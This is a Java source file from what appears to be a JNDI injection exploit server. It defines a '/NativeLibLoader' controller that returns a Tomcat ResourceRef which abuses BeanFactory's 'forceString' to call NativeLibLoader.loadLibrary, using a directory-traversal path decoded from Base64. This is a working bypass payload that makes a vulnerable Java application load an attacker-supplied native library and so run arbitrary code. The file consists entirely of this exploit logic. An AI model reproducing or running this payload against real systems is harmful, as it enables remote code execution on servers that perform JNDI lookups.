package com.example.exploit.controller;

import com.example.exploit.annotation.JNDIController;
import com.example.exploit.annotation.JNDIMapping;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;
import java.util.Base64;
import java.util.Hashtable;

@JNDIController
@JNDIMapping("/NativeLibLoader")
public class NativeLibLoaderController {
    public Hashtable<String, Object> process(Hashtable<String, String> params) throws Exception {
        ResourceRef ref = new ResourceRef("com.sun.glass.utils.NativeLibLoader", null, "", "",
                true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "a=loadLibrary"));
        ref.add(new StringRefAddr("a", "/../../../../../../../../../../../../" + params.get("path")));

        System.out.println("NativeLibLoader Bypass");

        Hashtable<String, Object> result = new Hashtable<>();
        result.put("ref", ref);
        return result;
    }

    @JNDIMapping("/{path}")
    public void load(Hashtable<String, String> params) {
        String path = new String(Base64.getUrlDecoder().decode(params.get("path")));
        params.replace("path", path);
        System.out.println("[LDAP] Native Library Path: " + path);
    }
}
